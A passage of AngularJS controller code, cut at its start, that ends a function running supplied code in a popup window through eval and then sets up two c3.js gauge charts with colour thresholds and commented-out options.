      eval(funcname+"();\n" + code);
    };
    button.click();
    win.document.close();
    win.close();
  };

  //graph initialization
  $scope.init_charts = function (){
    $scope.cmdgraph = true;

    $scope.chart = c3.generate({
    bindto: '#chart',        
    data: {
        columns: [
            ['data', 0]
        ],
        type: 'gauge',
    },
    gauge: {
//        label: {
//            format: function(value, ratio) {
//                return value;
//            },
//            show: false // to turn off the min/max labels.
//        },
//    min: 0, // 0 is default, //can handle negative min e.g. vacuum / voltage / current flow / rate of change
//    max: 100, // 100 is default
//    units: ' %',
//    width: 39 // for adjusting arc thickness
    },
    color: {
        pattern: ['#FF0000', '#F97600', '#F6C600', '#0066FF'], // the three color levels for the percentage values.
        threshold: {
//            unit: 'value', // percentage is default
//            max: 200, // 100 is default
            values: [30, 60, 90, 100]
        }
    }
  });

  $scope.chart2 = c3.generate({
  bindto: '#chart2',        
  data: {
      columns: [
          ['data', 0]
      ],
      type: 'gauge',
  },
  gauge: {
//        label: {
//            format: function(value, ratio) {
//                return value;
//            },
//            show: false // to turn off the min/max labels.
//        },
//    imn: 0, // 0 is default, //can handle negative min e.g. vacuum / voltage / current flow / rate of change
//    max: 100, // 100 is default
//    units: ' %',
    width: 39 // for adjusting arc thickness
  },
  color: {
      pattern: ['#FF0000', '#F97600', '#F6C600', '#60B044'], // the three color levels for the percentage values.
      threshold: {
//            unit: 'value', // percentage is default
//            max: 200, // 100 is default
          values: [30, 60, 90, 100]
      }
  }
  });
};



/*End bracers*/  
}]);
